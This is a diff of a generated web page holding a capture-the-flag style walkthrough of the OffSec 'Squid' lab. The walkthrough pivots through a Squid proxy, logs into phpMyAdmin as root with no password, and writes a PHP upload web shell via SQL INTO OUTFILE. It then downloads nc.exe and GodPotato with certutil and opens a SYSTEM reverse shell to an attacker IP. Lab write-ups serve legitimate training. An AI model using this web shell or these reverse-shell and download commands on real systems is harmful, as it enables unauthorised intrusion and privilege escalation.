@@ -3,7 +3,7 @@
   <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
     <meta charset="utf-8">
     <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
-    <meta name="generator" content="Hugo 0.154.5">
+    <meta name="generator" content="Hugo 0.161.1">
     <meta name="generator" content="Relearn 9.0.3+36307e4ed23582638ab689240ac7b427217803ee">
     <meta name="description" content="Offsec proving grounds Squid writeup - A penetration testing walkthrough exploiting a Squid proxy to access internal services, gain phpMyAdmin access, upload a web shell, and escalate privileges using GodPotato.">
     <meta name="author" content="">
@@ -30,27 +30,28 @@
     <meta itemprop="wordCount" content="382">
     <meta itemprop="keywords" content="Squid,Phpmyadmin,Spose,Proxy">
     <title>Squid :: Zenu</title>
-    <link href="/images/favicon.png?1779778938" rel="icon" type="image/png">
-    <link href="/css/auto-complete/auto-complete.min.css?1779778938" rel="stylesheet">
-    <script src="/js/auto-complete/auto-complete.min.js?1779778938" defer></script>
-    <script src="/js/search-lunr.js?1779778938" defer></script>
-    <script src="/js/search.js?1779778938" defer></script>
+    <link href="/images/favicon.png?1784855724" rel="icon" type="image/png">
+    <link href="/images/favicon.ico?1784855724" rel="icon" type="image/x-icon" sizes="any">
+    <link href="/css/auto-complete/auto-complete.min.css?1784855724" rel="stylesheet">
+    <script src="/js/auto-complete/auto-complete.min.js?1784855724" defer></script>
+    <script src="/js/search-lunr.js?1784855724" defer></script>
+    <script src="/js/search.js?1784855724" defer></script>
     <script>
       window.relearn = window.relearn || {};
-      window.relearn.index_js_url="/searchindex.en.js?1779778938";
+      window.relearn.index_js_url="/searchindex.en.js?1784855724";
     </script>
-    <script src="/js/lunr/lunr.min.js?1779778938" defer></script>
-    <script src="/js/lunr/lunr.stemmer.support.min.js?1779778938" defer></script>
-    <script src="/js/lunr/lunr.multi.min.js?1779778938" defer></script>
-    <script src="/js/lunr/lunr.en.min.js?1779778938" defer></script>
+    <script src="/js/lunr/lunr.min.js?1784855724" defer></script>
+    <script src="/js/lunr/lunr.stemmer.support.min.js?1784855724" defer></script>
+    <script src="/js/lunr/lunr.multi.min.js?1784855724" defer></script>
+    <script src="/js/lunr/lunr.en.min.js?1784855724" defer></script>
     <script>
       window.relearn = window.relearn || {};
       window.relearn.contentLangs=['en'];
     </script>
-    <link href="/fonts/fontawesome/css/all.min.css?1779778938" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/all.min.css?1779778938" rel="stylesheet"></noscript>
-    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1779778938" rel="stylesheet">
-    <link href="/css/theme.css?1779778938" rel="stylesheet">
-    <link href="/css/format-html.css?1779778938" rel="stylesheet" id="R-format-style">
+    <link href="/fonts/fontawesome/css/all.min.css?1784855724" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/all.min.css?1784855724" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1784855724" rel="stylesheet">
+    <link href="/css/theme.css?1784855724" rel="stylesheet">
+    <link href="/css/format-html.css?1784855724" rel="stylesheet" id="R-format-style">
     <script>
       window.relearn = window.relearn || {};
       // configuration
@@ -164,7 +165,7 @@
 
 <h1 id="initial-foothold">initial foothold<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
 <h2 id="nmap-scan">Nmap scan<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
 </span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
 </span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
 </span></span><span style="display:flex;"><span>3128/tcp  open  http-proxy    Squid http proxy 4.14
@@ -174,36 +175,36 @@
 </span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC</span></span></code></pre></div>
 <p>The scan results show that a Squid proxy is running on port 3128.</p>
 <h1 id="enumeration">enumeration<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
-<p><a href="#R-image-31956dfcbf3835eb9371e4645a5bc6e5" class="lightbox-link"><img alt="squid" class="lazy lightbox figure-image" loading="lazy" src="/images/squid/squid-3128.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-31956dfcbf3835eb9371e4645a5bc6e5"><img alt="squid" class="lazy lightbox lightbox-image" loading="lazy" src="/images/squid/squid-3128.png"></a></p>
+<p><a href="#R-image-511ef36fd97a1f531a421cdd5a7b28ea" class="lightbox-link"><img alt="squid" class="lazy lightbox figure-image" loading="lazy" src="/images/squid/squid-3128.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-511ef36fd97a1f531a421cdd5a7b28ea"><img alt="squid" class="lazy lightbox lightbox-image" loading="lazy" src="/images/squid/squid-3128.png"></a></p>
 <p>When accessing port 3128, only an error page is displayed.</p>
 <p>At first, I had no idea what to do with this port. While researching, I found an <a href="https://angelica.gitbook.io/hacktricks/network-services-pentesting/3128-pentesting-squid" rel="external">article</a> about enumerating Squid proxies.</p>
 <p>According to the article we can use the tool <code>spose.py</code>.</p>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 spose.py --proxy http://192.168.137.189:3128 --target 192.168.137.189
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 spose.py --proxy http://192.168.137.189:3128 --target 192.168.137.189
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Scanning default common ports
 </span></span><span style="display:flex;"><span>Using proxy address http://192.168.137.189:3128
 </span></span><span style="display:flex;"><span>192.168.137.189:3306 seems OPEN
 </span></span><span style="display:flex;"><span>192.168.137.189:8080 seems OPEN</span></span></code></pre></div>
 <p>This revealed that ports 3306 and 8080 were also accessible. These ports can be reached through the proxy.</p>
-<p><a href="#R-image-ac907e028bd08a8bf0380d2a1642dd9c" class="lightbox-link"><img alt="proxy" class="lazy lightbox figure-image" loading="lazy" src="/images/squid/squid-proxy.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-ac907e028bd08a8bf0380d2a1642dd9c"><img alt="proxy" class="lazy lightbox lightbox-image" loading="lazy" src="/images/squid/squid-proxy.png"></a></p>
+<p><a href="#R-image-8dcfd5145e96920734056b14381594f7" class="lightbox-link"><img alt="proxy" class="lazy lightbox figure-image" loading="lazy" src="/images/squid/squid-proxy.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-8dcfd5145e96920734056b14381594f7"><img alt="proxy" class="lazy lightbox lightbox-image" loading="lazy" src="/images/squid/squid-proxy.png"></a></p>
 <p>I configured proxy settings in FoxyProxy, pointing it to port 3128, and then attempted to access the web application.</p>
-<p><a href="#R-image-e6cc24e902ac94f104dc2869032860e9" class="lightbox-link"><img alt="phpmyadmin" class="lazy lightbox figure-image" loading="lazy" src="/images/squid/squid-phpmyadmin.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-e6cc24e902ac94f104dc2869032860e9"><img alt="phpmyadmin" class="lazy lightbox lightbox-image" loading="lazy" src="/images/squid/squid-phpmyadmin.png"></a></p>
+<p><a href="#R-image-45703654f6bbddcd15c79301cf1da479" class="lightbox-link"><img alt="phpmyadmin" class="lazy lightbox figure-image" loading="lazy" src="/images/squid/squid-phpmyadmin.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-45703654f6bbddcd15c79301cf1da479"><img alt="phpmyadmin" class="lazy lightbox lightbox-image" loading="lazy" src="/images/squid/squid-phpmyadmin.png"></a></p>
 <p>From the landing page, I found a link to <strong>phpmyadmin</strong> page.</p>
 <p>I tried the default credentials:</p>
 <p><code>root / ''</code></p>
 <p>and successfully logged in.</p>
-<p><a href="#R-image-0174b09462db426d1ade6e0a7ab04de0" class="lightbox-link"><img alt="login" class="lazy lightbox figure-image" loading="lazy" src="/images/squid/squid-login.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-0174b09462db426d1ade6e0a7ab04de0"><img alt="login" class="lazy lightbox lightbox-image" loading="lazy" src="/images/squid/squid-login.png"></a></p>
+<p><a href="#R-image-28056390d9b0fb266fdf97bdd527252f" class="lightbox-link"><img alt="login" class="lazy lightbox figure-image" loading="lazy" src="/images/squid/squid-login.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-28056390d9b0fb266fdf97bdd527252f"><img alt="login" class="lazy lightbox lightbox-image" loading="lazy" src="/images/squid/squid-login.png"></a></p>
 <h1 id="exploitation">exploitation<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
 <p>Using SQL statements, We can read and wirte files if we have sufficient privileges..</p>
 <p>Since I logged in as root, I had the necessary permissions.</p>
 <p>For example, we can read a file using:</p>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>load_file(<span style="color:#e6db74">&#39;c:\windows\win.ini&#39;</span>);</span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>load_file(<span style="color:#e6db74">&#39;c:\windows\win.ini&#39;</span>);</span></span></code></pre></div>
 <p>And write a file using:</p>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span>
 </span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&lt;?php echo \&#39;&lt;form action=\&#34;</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34; method=\&#34;</span>post<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34; enctype=\&#34;</span>multipart<span style="color:#f92672">/</span>form<span style="color:#f92672">-</span><span style="color:#66d9ef">data</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34; name=\&#34;</span>uploader<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34; id=\&#34;</span>uploader<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34;&gt;\&#39;;echo \&#39;&lt;input type=\&#34;</span>file<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34; name=\&#34;</span>file<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34; size=\&#34;</span><span style="color:#ae81ff">50</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34;&gt;&lt;input name=\&#34;</span>_upl<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34; type=\&#34;</span>submit<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34; id=\&#34;</span>_upl<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34; value=\&#34;</span>Upload<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34;&gt;&lt;/form&gt;\&#39;; if( $_POST[\&#39;_upl\&#39;] == \&#34;</span>Upload<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34; ) { if(@copy($_FILES[\&#39;file\&#39;][\&#39;tmp_name\&#39;], $_FILES[\&#39;file\&#39;][\&#39;name\&#39;])) { echo \&#39;&lt;b&gt;Upload Done.&lt;b&gt;&lt;br&gt;&lt;br&gt;\&#39;; }else { echo \&#39;&lt;b&gt;Upload Failed.&lt;/b&gt;&lt;br&gt;&lt;br&gt;\&#39;; }}?&gt;&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">INTO</span> OUTFILE <span style="color:#e6db74">&#39;C:/wamp/www/uploader.php&#39;</span>;</span></span></code></pre></div>
 
@@ -217,10 +218,10 @@
   </div>
 </details>
 <p>After executing the command, navigate to the URL to confirm that it works.</p>
-<p><a href="#R-image-cae6b18b39bdf476fe00131e8bb502c5" class="lightbox-link"><img alt="webshell" class="lazy lightbox figure-image" loading="lazy" src="/images/squid/squid-uploader2.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-cae6b18b39bdf476fe00131e8bb502c5"><img alt="webshell" class="lazy lightbox lightbox-image" loading="lazy" src="/images/squid/squid-uploader2.png"></a></p>
+<p><a href="#R-image-5779c43f386291d4e7e85b53cf3df25d" class="lightbox-link"><img alt="webshell" class="lazy lightbox figure-image" loading="lazy" src="/images/squid/squid-uploader2.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-5779c43f386291d4e7e85b53cf3df25d"><img alt="webshell" class="lazy lightbox lightbox-image" loading="lazy" src="/images/squid/squid-uploader2.png"></a></p>
 <p>Nice! Now we can upload a reverse shell and execute it.</p>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\wamp\www<span style="color:#75715e">&gt;whoami</span>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\wamp\www<span style="color:#75715e">&gt;whoami</span>
 </span></span><span style="display:flex;"><span>nt authority\local service</span></span></code></pre></div>
 <h1 id="privilege-escalation">privilege escalation<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
 <p>At this point, we still couldn&rsquo;t access the Administrator folder.</p>
@@ -230,10 +231,10 @@
 <p>The user has write permissions to the directory:</p>
 <p><code>C:\wamp\tmp</code></p>
 <p>I downloaded the files using certutil:</p>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>certutil -urlcache -split -f http://192.168.45.202/nc.exe nc.exe
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>certutil -urlcache -split -f http://192.168.45.202/nc.exe nc.exe
 </span></span><span style="display:flex;"><span>certutil -urlcache -split -f http://192.168.45.202/godpotato.exe godpotato.exe</span></span></code></pre></div>
 <p>Finally, I obtained a reverse shell with SYSTEM privileges.</p>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>godpotato.exe -cmd <span style="color:#e6db74">&#34;nc.exe 192.168.45.202 443 -e cmd&#34;</span>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>godpotato.exe -cmd <span style="color:#e6db74">&#34;nc.exe 192.168.45.202 443 -e cmd&#34;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>C:\Users\Administrator\Desktop<span style="color:#75715e">&gt;type proof.txt</span>
 </span></span><span style="display:flex;"><span>
@@ -341,8 +342,8 @@
 <div id="R-footer" class="default-animation"><p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p></div>
       </div>
     </aside>
-    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1779778938" defer></script>
-    <script src="/js/theme.js?1779778938" defer></script>
+    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1784855724" defer></script>
+    <script src="/js/theme.js?1784855724" defer></script>
     <div id="toast-container" role="status" aria-live="polite" aria-atomic="false"></div>
   </body>
 </html>
